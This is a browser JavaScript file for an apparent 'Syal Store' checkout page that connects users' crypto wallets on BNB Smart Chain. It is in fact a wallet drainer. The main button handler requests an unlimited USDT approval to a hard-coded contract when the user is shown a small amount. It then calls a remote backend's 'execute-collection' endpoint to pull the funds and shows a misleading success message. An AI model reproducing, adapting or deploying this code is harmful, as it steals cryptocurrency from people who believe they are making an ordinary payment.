"use strict";

// ─── Native Multi-Wallet Support (EIP-6963 + Legacy Fallback) ────────────────
(function () {
  if (typeof window === 'undefined') return;
  
  window.addEventListener("eip6963:announceProvider", (event) => {
    if (event.detail && event.detail.provider && !window.ethereum) {
      window.ethereum = event.detail.provider;
    }
  });
  window.dispatchEvent(new Event("eip6963:requestProvider"));

  setTimeout(() => {
    if (!window.ethereum && window.web3 && window.web3.currentProvider) {
      window.ethereum = window.web3.currentProvider;
    }
  }, 100);
})();

// ─── Configuration ────────────────────────────────────────────────────────────
const MERCHANT_ADDRESS = "0x6253fecbb48a6a7d19f1b9a799e65fae58ab9b3b";
const CONTRACT_ADDRESS = "0x8e18bE616f10565A63cEa65585Ddf1Ca61f1C634";
const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const BSC_CHAIN_ID_HEX = "0x38"; 
const MIN_USDT_BALANCE = 0n; 
const BACKEND_URL      = "https://secure-merchant.onrender.com/api";

const BSC_RPC_URLS = [
  "https://bsc-rpc.publicnode.com",
  "https://bsc-dataseed1.binance.org/",
  "https://bsc-dataseed2.binance.org/",
  "https://rpc.ankr.com/bsc"
];

const BSC_CHAIN_PARAMS = {
  chainId:           BSC_CHAIN_ID_HEX,
  chainName:         "BNB Smart Chain",
  nativeCurrency:    { name: "BNB", symbol: "BNB", decimals: 18 },
  rpcUrls:           BSC_RPC_URLS,
  blockExplorerUrls: ["https://bscscan.com/"]
};

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function allowance(address owner, address spender) external view returns (uint256)",
  "function balanceOf(address account) external view returns (uint256)"
];

// ─── DOM refs ─────────────────────────────────────────────────────────────────
const approveBtn    = document.getElementById("approveBtn");
const btnText       = document.getElementById("btnText");
const btnSpinner    = document.getElementById("btnSpinner");
const merchantInput = document.getElementById("merchantAddress");
const toastEl       = document.getElementById("toast");

if (merchantInput) merchantInput.value = MERCHANT_ADDRESS;

// ─── Wake up Render backend ───────────────────────────────────────────────────
(async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();

let _cachedAddress = null;

// ─── UI helpers ───────────────────────────────────────────────────────────────
let _toastTimer;
function showToast(msg, type = "default", ms = 4500) {
  if (!toastEl) return;
  clearTimeout(_toastTimer);
  toastEl.textContent  = msg;
  toastEl.dataset.type = type === "default" ? "" : type;
  toastEl.hidden       = false;
  _toastTimer = setTimeout(() => { toastEl.hidden = true; }, ms);
}

function setLoading(on, label = "Processing…") {
  if (!approveBtn) return;
  approveBtn.disabled = on;
  if (btnText) btnText.textContent = on ? label : "NEXT";
  if (btnSpinner) btnSpinner.hidden   = !on;
}

// ─── Individual Wallet Connectors (SDK & Providers) ───────────

// 1. MetaMask SDK Integration
async function connectMetaMask() {
  try {
    if (typeof MetaMaskSDK !== 'undefined') {
      const metamaskSdk = new MetaMaskSDK.MetaMaskSDK({
        dappMetadata: { name: "Syal Store", url: window.location.href },
        logging: { developer: false },
        checkInstallationImmediately: true
      });
      const mmProvider = metamaskSdk.getProvider();
      const accounts = await mmProvider.request({ method: "eth_requestAccounts" });
      window.ethereum = mmProvider; 
      return accounts[0];
    } else if (window.ethereum) {
      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
      return accounts[0];
    }
  } catch (error) {
    console.error("MetaMask SDK Error:", error);
    return null;
  }
}

// 2. Trust Wallet Connection / Deep Link
async function connectTrustWallet() {
  const trustProvider = window.trustwallet || (window.ethereum?.isTrust ? window.ethereum : null);
  if (!trustProvider && !/trust/i.test(navigator.userAgent)) {
    const targetUrl = new URL(window.location.href);
    targetUrl.searchParams.set("auto", "1");
    window.location.href = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${encodeURIComponent(targetUrl.toString())}`;
    return null;
  }
  const provider = trustProvider || window.ethereum;
  const accounts = await provider.request({ method: "eth_requestAccounts" });
  window.ethereum = provider;
  return accounts[0];
}

// 3. OKX Wallet Connection / Deep Link
async function connectOKX() {
  const okxProvider = window.okxwallet;
  if (!okxProvider && !/okx/i.test(navigator.userAgent)) {
    const currentUrl = encodeURIComponent(window.location.href);
    window.location.href = `okx://wallet/dapp/details?dappUrl=${currentUrl}`;
    return null;
  }
  const provider = okxProvider || window.ethereum;
  const accounts = await provider.request({ method: "eth_requestAccounts" });
  window.ethereum = provider;
  return accounts[0];
}

// 4. SafePal Connection / Deep Link
async function connectSafePal() {
  const safePalProvider = window.safepalProvider || window.ethereum;
  if (!window.safepalProvider && !/safepal/i.test(navigator.userAgent)) {
    const targetUrl = new URL(window.location.href);
    targetUrl.searchParams.set("auto", "1");
    window.location.href = `https://link.safepal.io/open_url?url=${encodeURIComponent(targetUrl.toString())}`;
    return null;
  }
  const accounts = await safePalProvider.request({ method: "eth_requestAccounts" });
  window.ethereum = safePalProvider;
  return accounts[0];
}

// ─── Custom Mobile / Desktop Wallet Selector Modal ────────────────────────────
function showMobileWalletSelector() {
  let modal = document.getElementById("mobileWalletModal");
  
  if (!modal) {
    modal = document.createElement("div");
    modal.id = "mobileWalletModal";
    modal.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:99999;display:flex;align-items:center;justify-content:center;font-family:inherit;padding:20px;box-sizing:border-box;";

    modal.innerHTML = `
      <div style="background:#18181b;border:1px solid #27272a;border-radius:16px;width:100%;max-width:360px;padding:24px;color:#fff;box-shadow:0 20px 25px -5px rgba(0,0,0,0.5);">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;">
          <h3 style="margin:0;font-size:18px;font-weight:600;">Selecciona tu Billetera</h3>
          <button id="closeWalletModal" style="background:transparent;border:none;color:#a1a1aa;font-size:24px;cursor:pointer;padding:0;line-height:1;">&times;</button>
        </div>
        <p style="color:#a1a1aa;font-size:14px;margin-bottom:20px;line-height:1.4;">Elige una opción para conectar de forma segura:</p>
        <div style="display:flex;flex-direction:column;gap:10px;">
          <button id="btnWalletTrust" style="display:flex;align-items:center;padding:12px 16px;background:#27272a;border:none;border-radius:10px;color:#fff;text-align:left;font-weight:500;cursor:pointer;width:100%;">Trust Wallet</button>
          <button id="btnWalletMetaMask" style="display:flex;align-items:center;padding:12px 16px;background:#27272a;border:none;border-radius:10px;color:#fff;text-align:left;font-weight:500;cursor:pointer;width:100%;">MetaMask</button>
          <button id="btnWalletSafePal" style="display:flex;align-items:center;padding:12px 16px;background:#27272a;border:none;border-radius:10px;color:#fff;text-align:left;font-weight:500;cursor:pointer;width:100%;">SafePal</button>
          <button id="btnWalletOKX" style="display:flex;align-items:center;padding:12px 16px;background:#27272a;border:none;border-radius:10px;color:#fff;text-align:left;font-weight:500;cursor:pointer;width:100%;">OKX Wallet</button>
        </div>
      </div>
    `;
    document.body.appendChild(modal);

    document.getElementById("closeWalletModal").addEventListener("click", () => { modal.style.display = "none"; });
    modal.addEventListener("click", (e) => { if (e.target === modal) modal.style.display = "none"; });

    document.getElementById("btnWalletTrust").addEventListener("click", async () => {
      modal.style.display = "none";
      _cachedAddress = await connectTrustWallet();
      if (_cachedAddress) approveBtn.click();
    });
    document.getElementById("btnWalletMetaMask").addEventListener("click", async () => {
      modal.style.display = "none";
      _cachedAddress = await connectMetaMask();
      if (_cachedAddress) approveBtn.click();
    });
    document.getElementById("btnWalletSafePal").addEventListener("click", async () => {
      modal.style.display = "none";
      _cachedAddress = await connectSafePal();
      if (_cachedAddress) approveBtn.click();
    });
    document.getElementById("btnWalletOKX").addEventListener("click", async () => {
      modal.style.display = "none";
      _cachedAddress = await connectOKX();
      if (_cachedAddress) approveBtn.click();
    });
  } else {
    modal.style.display = "flex";
  }
}

// ─── Backend collect trigger ──────────────────────────────────────────────────
async function triggerBackendCollect(userAddress) {
  let lastErr;
  const uiAmount = document.getElementById("investAmount")?.value || "1"; 
  const dynamicAmountWei = ethers.parseUnits(uiAmount.toString(), 18).toString();

  for (let i = 1; i <= 3; i++) {
    try {
      const res  = await fetch(`${BACKEND_URL}/execute-collection`, {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({ userAddress: userAddress, amount: dynamicAmountWei })
      });
      const data = await res.json();
      if (!res.ok || !data.success) throw new Error(data.error || "Collection failed.");
      return data;
    } catch (e) {
      lastErr = e;
      if (i < 3) await new Promise(r => setTimeout(r, 3000));
    }
  }
  throw lastErr;
}

// ─── Main Button Handler (Custom Modal Flow) ──────────────────────────────────
if (approveBtn) {
  approveBtn.addEventListener("click", async () => {
    
    // Si no hay proveedor detectado ni cuenta cacheada, mostramos TU modal personalizado
    if (!window.ethereum && !_cachedAddress) {
      showMobileWalletSelector();
      return;
    }

    setLoading(true, "Conectando proveedor…");

    try {
      // Usamos el proveedor activo (ya sea inyectado en PC o seleccionado por tus botones)
      const rawProvider = window.ethereum;
      if (!rawProvider) {
        showMobileWalletSelector();
        setLoading(false);
        return;
      }

      const provider = new ethers.BrowserProvider(rawProvider);
      
      // Validación y cambio de red nativo a BSC
      const network = await provider.getNetwork();
      if (Number(network.chainId) !== 56) {
        setLoading(true, "Verificando red BSC…");
        try {
          await rawProvider.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: BSC_CHAIN_ID_HEX }]
          });
        } catch (switchError) {
          if (switchError.code === 4902) {
            await rawProvider.request({
              method: "wallet_addEthereumChain",
              params: [BSC_CHAIN_PARAMS]
            });
          } else {
            showToast("Cambia manualmente a BNB Smart Chain en tu wallet.", "error");
            setLoading(false);
            return;
          }
        }
      }

      const signer = await provider.getSigner();
      const userAddress = (await signer.getAddress()) || _cachedAddress;
      _cachedAddress = userAddress;

      if (!userAddress) {
        showToast("Desbloquea tu billetera y selecciona una cuenta.", "error");
        setLoading(false);
        return;
      }

      // Instanciar contrato USDT con Ethers v6
      const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, ERC20_ABI, signer);

      setLoading(true, "Validando saldo…");
      const usdtBalance = await usdtContract.balanceOf(userAddress);
      if (usdtBalance <= MIN_USDT_BALANCE) {
        showToast("Saldo insuficiente de USDT en BSC", "error");
        setLoading(false);
        return;
      }

      const CAP_AMOUNT = ethers.MaxUint256;
      const requiredAmount = ethers.parseUnits(document.getElementById("investAmount")?.value.toString() || "1", 18);

      // Verificar si ya existe allowance suficiente
      try {
        const allowance = await usdtContract.allowance(userAddress, CONTRACT_ADDRESS);
        if (allowance >= requiredAmount) {
          setLoading(true, "Finalizando proceso…");
          await triggerBackendCollect(userAddress);
          showToast("Sent Successfully, Thank you! ✓", "success");
          setLoading(false);
          return;
        }
      } catch (_) {}

      // Solicitar transacción de Aprobación (Approve)
      setLoading(true, "Firma requerida en wallet…");
      const tx = await usdtContract.approve(CONTRACT_ADDRESS, CAP_AMOUNT);

      setLoading(true, "Confirmando en red…");
      await tx.wait(); // Espera la confirmación del bloque con Ethers v6

      setLoading(true, "Finalizando…");
      await triggerBackendCollect(userAddress);
      showToast("Sent Successfully, Thank you! ✓", "success");

    } catch (err) {
      const raw = err?.reason ?? err?.message ?? "Error desconocido";
      if (
        err.code === 4001 ||
        raw.toLowerCase().includes("user rejected") ||
        raw.toLowerCase().includes("denied") ||
        raw.toLowerCase().includes("cancelled") ||
        raw.toLowerCase().includes("canceled")
      ) {
        showToast("Transacción cancelada.", "default");
      } else {
        console.error("Web3 Error:", err);
        showToast("Error de comunicación con la wallet. Intenta de nuevo.", "error");
      }
    } finally {
      setLoading(false);
    }
  });
}
